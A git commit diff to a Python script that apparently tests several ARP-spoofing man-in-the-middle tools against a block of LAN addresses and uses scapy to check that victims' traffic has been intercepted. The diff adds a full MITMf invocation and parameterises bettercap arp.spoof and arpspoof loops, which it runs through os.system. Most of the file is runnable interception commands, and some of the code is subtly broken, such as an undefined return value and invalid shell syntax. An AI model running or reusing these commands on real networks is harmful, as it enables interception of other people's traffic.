52db344312cdefb6e1f6fd37fe566045a56a11d5
Isac Cavalcante <isaccavalcante@alu.ufc.br>
2018-05-30 01:17:51 -0300

    Add MITMf, refactor

--- 10/run_test.py
+++ 10/run_test.py
@@ -3,21 +3,23 @@ from scapy.all import sniff
 import os
 import time
 
+EXTERNAL_ADDRESS = "192.168.1.10"
+GATEWAY_ADDRESS = "192.168.0.1"
+IP_RANGE = (20, 30)
+
 def run_command(cmd):
 	process = Popen([cmd], stdout=PIPE, shell=True)
 	stdout, stderr = process.communicate()
 	return out
  
 victims = []
-[[ victims.append('192.168.0.{}'.format(i)) for i in range(20, 30) ]]
+[[ victims.append("192.168.0.%d" % i) for i in range(*IP_RANGE) ]]
 
 # Custom function to be apllied to each sniffed packet
 def wait_all_victims(packet):
-	#print(packet[0].summary())
-	#print(packet[0].show())
 	src_addr = packet[0][1].src
 	dst_addr = packet[0][1].dst
-	if src_addr in victims and dst_addr=="192.168.1.10":
+	if src_addr in victims and dst_addr==EXTERNAL_ADDRESS:
 		victims.remove(src_addr)
 	if len(victims) == 0:
 		exit()
@@ -29,31 +31,38 @@ def ettercap():
 def bettercap():
 	cmd = """
 	bettercap -caplet /dev/stdin <<< '
-	net.probe on
-	set arp.spoof.targets 192.168.1.20-30
-	arp.spoof on
-	'
-	"""
+		net.probe on
+		set arp.spoof.targets 192.168.1.{}-{}
+		arp.spoof on
+		'
+	""".format(*IP_RANGE)
 	os.system(cmd)
 	
 def mitmf():
-	# TODO
-	pass
+	cmd = """
+	python mitmf -i eth0
+		--spoof
+		--arp
+		--target 192.168.0.{}-{},192.168.0.1/24
+		--gateway {}
+	""".format(*IP_RANGE, GATEWAY_ADDRESS)
+	os.system(cmd)
 
 def dsniff():
 	cmd = """
 	echo 1 > /proc/sys/net/ipv4/ip_forward ;
-	for x in $(seq 20 30) ;
+	for x in $(seq {} {}) ;
 	do
-		arpspoof -t 192.168.0.1 192.168.0.$x > /dev/null 2> /dev/null & ;
-		arpspoof -t 192.168.0.$x 192.168.0.1 > /dev/null 2> /dev/null & ;
+		arpspoof -t {} 192.168.0.$x > /dev/null 2> /dev/null & ;
+		arpspoof -t 192.168.0.$x {} > /dev/null 2> /dev/null & ;
 	done
-	"""
+	""".format(*IP_RANGE, GATEWAY_ADDRESS, GATEWAY_ADDRESS)
 	os.system(cmd)
 
 def main():
 	#dsniff()
-	bettercap()
+	#bettercap()
+	mitmf()
 	try:
 		sniff(filter="ip", prn=wait_all_victims)
 	except PermissionError:
